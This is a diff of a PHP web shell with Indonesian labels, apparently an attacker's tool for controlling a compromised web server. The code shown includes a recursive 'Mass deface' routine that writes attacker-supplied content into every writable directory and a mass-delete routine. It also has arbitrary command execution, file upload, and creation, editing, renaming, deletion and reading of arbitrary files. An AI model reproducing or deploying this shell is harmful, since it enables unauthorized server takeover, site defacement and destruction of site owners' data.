@@ -25,15 +25,15 @@ if(isset($_GET['path'])) {
 	$▚ = getcwd();
 }
 if(is_writable($▚)) {
-	return "<font color='green'>".$p."</font>";
+	return "<gr>".$p."</gr>";
 } else {
-	return "<font color='red'>".$p."</font>";
+	return "<rd>".$p."</rd>";
 	}
 }
 function ok(){
 	echo '<div class="alert alert-success alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
 }
-function fail(){
+function er(){
 	echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert"><button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>';
 }
 function sz($byt){
@@ -107,10 +107,14 @@ echo "
 	color: #fff;
 }
 .pre {
-	height: 150px;
+	height: 500px;
 	overflow: auto;
 	white-space: pre-wrap;
 	flex-grow: 1;
+	margin:10px auto;
+	padding:10px;
+	line-height:1.3em;
+	overflow-x:scroll;
 }
 </style>
 <body class='bg-secondary text-light'>
@@ -167,22 +171,23 @@ for($i = 0; $i <= $c_dir; $i++) {
 	$scdir[$i];
 	if($i != $c_dir) {
 } elseif($_GET['id'] == 'deface'){
-	function mass_kabeh($dir,$namafile,$isi_script) {
-	if(is_writable($dir)) {
-		$dira = scandir($dir);
-		foreach($dira as $dirb) {
-			$dirc = "$dir/$dirb";
-			$▚ = $dirc.'/'.$namafile;
-			if($dirb === '.') {
-				file_put_contents($▚, $isi_script);
-			} elseif($dirb === '..') {
-				file_put_contents($▚, $isi_script);
-			} else {
-				if(is_dir($dirc)) {
-					if(is_writable($dirc)) {
-						echo "[<gr>success</gr>]&nbsp;$▚<br>";
-						file_put_contents($▚, $isi_script);
-						$▟ = mass_kabeh($dirc,$namafile,$isi_script);
+echo "$_s";
+function mass_kabeh($dir,$namafile,$isi_script) {
+if(is_writable($dir)) {
+	$dira = scandir($dir);
+	foreach($dira as $dirb) {
+		$dirc = "$dir/$dirb";
+		$▚ = $dirc.'/'.$namafile;
+		if($dirb === '.') {
+			file_put_contents($▚, $isi_script);
+		} elseif($dirb === '..') {
+			file_put_contents($▚, $isi_script);
+		} else {
+			if(is_dir($dirc)) {
+				if(is_writable($dirc)) {
+					echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
+					file_put_contents($▚, $isi_script);
+					$▟ = mass_kabeh($dirc,$namafile,$isi_script);
 					}
 				}
 			}
@@ -202,7 +207,7 @@ function mass_biasa($dir,$namafile,$isi_script) {
 			} else {
 				if(is_dir($dirc)) {
 					if(is_writable($dirc)) {
-						echo "[<gr>success</gr>]&nbsp;$dirb/$namafile<br>";
+						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$dirb/$namafile<br>";
 						file_put_contents($▚, $isi_script);
 					}
 				}
@@ -212,27 +217,24 @@ function mass_biasa($dir,$namafile,$isi_script) {
 }
 if($_POST['start']) {
 	if($_POST['tipe'] == 'massal') {
-		echo "<div style='margin: 5px auto; padding: 5px'>";
 	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
-		echo "</div>";
 	} elseif($_POST['tipe'] == 'biasa') {
-		echo "<div style='margin: 5px auto; padding: 5px'>";
 	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
-		echo "</div>";
 	}
-} else {
-echo "$_s
+	echo "<br>";
+}
+echo "
 <div class='card text-dark'>
 	<div class='card-header'>
 		<form method='POST'>
 		<kbd>$_x&nbsp;Mass deface</kbd>
 		<br>Tipe:<br>
 		<div class='custom-control custom-switch'>
-			<input type='checkbox' id='customSwitch' class='custom-control-input' name='tipe' value='biasa'>
+			<input class='custom-control-input' type='checkbox' id='customSwitch' name='tipe' value='biasa'>
 			<label class='custom-control-label' for='customSwitch'>Biasa</label>
 		</div>
 		<div class='custom-control custom-switch'>
-			<input type='checkbox' id='customSwitch1' class='custom-control-input' name='tipe' value='massal'>
+			<input class='custom-control-input' type='checkbox' id='customSwitch1' name='tipe' value='massal'>
 			<label class='custom-control-label' for='customSwitch1'>Massal</label>
 		</div>
 			<i class='bi bi-folder'></i> Lokasi:
@@ -246,7 +248,6 @@ echo "$_s
 	</div>
 </div>
 <br>";
-	}
 } elseif($_GET['id'] == 'cmd'){
 if($_POST['ekseCMD']) {
 $cmd = $_POST['ekseCMD'];
@@ -321,21 +322,22 @@ if(isset($_FILES['file'])){
 	if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
 		echo '<strong>Upload</strong> ok! '.ok().'</div>';
 		} else {
-		echo '<strong>Upload</strong> fail! '.fail().'</div>';
+		echo '<strong>Upload</strong> gagal! '.er().'</div>';
 		}
 	}
 echo "
 		<form method='POST' enctype='multipart/form-data'>
 			<kbd>$_x&nbsp;Upload File</kbd>
 			<div class='input-group mb-3'>
-				<input type='file' class='form-control form-control-sm' name='file' $_r>
-				<button type='submit' class='btn btn-dark btn-sm'><i class='bi bi-arrow-return-right'></i></button>
+				<input class='form-control form-control-sm' type='file' name='file' $_r>
+				<button class='btn btn-dark btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
 			</div>
 		</form>
 	</div>
 </div>
 <br>";
 } elseif($_GET['id'] == 'filebaru') {
+echo "$_s";
 if(isset($_POST['bikin'])){
 	$name = $_POST['nama_file'];
 	$isi_file = $_POST['isi_file'];
@@ -343,79 +345,81 @@ if(isset($_POST['bikin'])){
 		$handle = @fopen("$nama_file", "w");
 		if($isi_file){
 			$buat = @fwrite($handle, $isi_file);
-		}else{
+		} else {
 			$buat = $handle;
 		}
 	}
 	if($buat){
 		echo '<strong>Buat file</strong> ok! '.ok().'</div>';
-	}else{
-		echo '<strong>Buat file</strong> fail! '.fail().'</div>';
+	} else {
+		echo '<strong>Buat file</strong> gagal! '.er().'</div>';
 		}
 	}
-echo "$_s
+echo "
 <div class='card text-dark'>
 	<div class='card-header'>
 		<kbd>$_x&nbsp;Buat file</kbd>
 		<form method='POST'>
 			<i class='bi bi-file-earmark'></i> Nama file:
-			<input type='text' class='form-control form-control-sm' name='nama_file[]' placeholder='Nama file' $_r>
+			<input class='form-control form-control-sm' type='text' name='nama_file[]' placeholder='Nama file' $_r>
 			<i class='bi bi-file-earmark'></i> Isi file:
-			<textarea name='isi_file' class='form-control form-control-sm' rows='7' placeholder='Isi file' $_r ></textarea>
-			<input type='submit' class='btn btn-dark btn-sm btn-block' name='bikin' value='buat'>
+			<textarea class='form-control form-control-sm' name='isi_file' rows='7' placeholder='Isi file' $_r ></textarea>
+			<input class='btn btn-dark btn-sm btn-block' type='submit' name='bikin' value='buat'>
 		</form>
 	</div>
 </div>
 <br>";
 } elseif($_GET['id'] == 'dirbaru'){
+echo "$_s";
 if(isset($_POST['buat'])){
-	$nama = $_POST['nama_folder'];
-	foreach ($nama as $nama_folder){
-		$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_folder);
+	$nama = $_POST['nama_dir'];
+	foreach ($nama as $nama_dir){
+		$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})", '', $nama_dir);
 		$fd = @mkdir ($folder);
 	}
 	if($fd){
 		echo '<strong>Buat dir</strong> ok! '.ok().'</div>';
-	}else{
-		echo '<strong>Buat dir</strong> fail! '.fail().'</div>';
+	} else {
+		echo '<strong>Buat dir</strong> gagal! '.er().'</div>';
 		}
 	}
-echo "$_s
+echo "
 <div class='card text-dark'>
 	<div class='card-header'>
 		<kbd>$_x&nbsp;Buat dir</kbd>
 		<form method='POST'>
 			<i class='bi bi-folder'></i> Nama dir:
 			<div class='input-group mb-3'>
-				<input type='text' class='form-control form-control-sm' name='nama_folder[]' placeholder='Nama dir' $_r>
-				<input type='submit' class='btn btn-dark btn-sm' name='buat' value='buat'>
+				<input class='form-control form-control-sm' type='text' name='nama_dir[]' placeholder='Nama dir' $_r>
+				<input class='btn btn-dark btn-sm' type='submit' name='buat' value='buat'>
 			</div>
 		</form>
 	</div>
 </div>
 <br>";
 } elseif($_GET['id'] == 'delete'){
+echo "$_s";
 function hapus_massal($dir,$namafile) {
-	if(is_writable($dir)) {
-		$dira = scandir($dir);
-		foreach($dira as $dirb) {
-			$dirc = "$dir/$dirb";
-			$▚ = $dirc.'/'.$namafile;
-			if($dirb === '.') {
-				if(file_exists("$dir/$namafile")) {
-					unlink("$dir/$namafile");
-				}
-			} elseif($dirb === '..') {
-				if(file_exists("".dirname($dir)."/$namafile")) {
-					unlink("".dirname($dir)."/$namafile");
-				}
-			} else {
-				if(is_dir($dirc)) {
-					if(is_writable($dirc)) {
-						if(file_exists($▚)) {
-							echo "[<gr>deleted</gr>]&nbsp;$▚<br>";
-							unlink($▚);
-							$▟ = hapus_massal($dirc,$namafile);
+if(is_writable($dir)) {
+	$dira = scandir($dir);
+	foreach($dira as $dirb) {
+		$dirc = "$dir/$dirb";
+		$▚ = $dirc.'/'.$namafile;
+		if($dirb === '.') {
+			if(file_exists("$dir/$namafile")) {
+				unlink("$dir/$namafile");
+			}
+		} elseif($dirb === '..') {
+			if(file_exists("".dirname($dir)."/$namafile")) {
+				unlink("".dirname($dir)."/$namafile");
+			}
+		} else {
+			if(is_dir($dirc)) {
+				if(is_writable($dirc)) {
+					if(file_exists($▚)) {
+						echo "[<gr><i class='bi bi-check-all'></i></gr>]&nbsp;$▚<br>";
+						unlink($▚);
+						$▟ = hapus_massal($dirc,$namafile);
 						}
 					}
 				}
@@ -424,11 +428,10 @@ function hapus_massal($dir,$namafile) {
 	}
 }
 if($_POST['start']) {
-echo "<div style='margin: 5px auto; padding: 5px'>";
 	hapus_massal($_POST['d_dir'], $_POST['d_file']);
-echo "</div>";
-} else {
-echo "$_s
+	echo "<br>";
+}
+echo "
 <div class='card text-dark'>
 	<div class='card-header'>
 		<form method='POST'>
@@ -447,13 +450,12 @@ echo "$_s
 	</div>
 </div>
 <br>";
-		}
 	}
 }
 // akhir tools
 if(isset($_GET['filesrc'])){
 echo "<br><b>name : </b>".basename($_GET['filesrc']);"</br>";
-echo '<div class="shell pre"><pre style="font-size:10px;">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre></div><br/>';
+echo '<div class="shell pre" id="see"><pre style="font-size:10px;">'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre></div><br/>';
 } elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
 echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
 //rename file
@@ -462,7 +464,7 @@ if(isset($_POST['newname'])){
 if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
 echo '<strong>Rename</strong> ok! '.ok().'</div>';
 	} else {
-echo '<strong>Rename</strong> fail! '.fail().'</div>';
+echo '<strong>Rename</strong> gagal! '.er().'</div>';
 }
 $_POST['name'] = $_POST['newname'];
 }
@@ -481,7 +483,7 @@ $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){
 echo '<strong>Edit</strong> ok! '.ok().'</div>';
 	} else {
-echo '<strong>Edit</strong> fail! '.fail().'</div>';
+echo '<strong>Edit</strong> gagal! '.er().'</div>';
 }
 fclose($fp);
 }
@@ -501,13 +503,13 @@ if($_POST['type'] == 'dir'){
 if(rmdir($_POST['path'])){
 	echo '<strong>Delete dir</strong> ok! '.ok().'</div>';
 	} else {
-	echo '<strong>Delete dir</strong> fail! '.fail().'</div>';
+	echo '<strong>Delete dir</strong> gagal! '.er().'</div>';
 	}
 } elseif($_POST['type'] == 'file'){
 if(unlink($_POST['path'])){
 	echo '<strong>Delete file</strong> ok! '.ok().'</div>';
 	} else {
-	echo '<strong>Delete file</strong> fail! '.fail().'</div>';
+	echo '<strong>Delete file</strong> gagal! '.er().'</div>';
 		}
 	}
 }
